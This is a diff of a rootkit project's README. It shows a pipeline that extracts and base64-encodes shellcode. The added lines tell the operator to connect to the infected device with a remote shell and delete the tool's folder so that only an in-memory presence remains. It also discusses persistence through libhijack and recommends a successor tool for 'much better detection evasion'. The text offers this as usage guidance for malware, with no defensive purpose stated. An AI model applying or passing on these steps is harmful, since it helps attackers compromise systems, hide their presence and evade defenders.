@@ -32,10 +32,12 @@ You can parse out only the shellcode and base64 encode it like this:
 grep '"' shellcode.txt | tr "\n" " " | sed -e 's/\" \"//g;s/\"//g;s/;//g' | base64
 ```
 
-Then you may run ish with the ip of the device the rootkit was ran on to connect.
+Then you may run ish with the ip of the device the rootkit was ran on to connect and remove the 'tito' folder and any files within it. Now you will only have an in memory presence. 
 
 Currently tested on x86_64 Debian Trixie and FreeBSD 14.1
 
 People from HardenedBSD have reported the shell here will also work with libhijack to add persistance. That utility will load a Shared Library in memory making this a complete In-Memory rootkit for BSD if you choose. 
 
 Previously I did not include persistance with Linux as 1. - Persistance would require writing to disk and 2. - Many servers remain up thousands of days without a reboot making it pointless. In the optional-persistnace you may now find an additional README file to deploy this feature if you choose.
+
+Later thoughts: Some of the code in the shell prevented compiling statically. For this reason I would now recommend using <a href="https://github.com/mephistolist/hoxha">Hoxha</a> as it allows this and has much better detection evasion. 
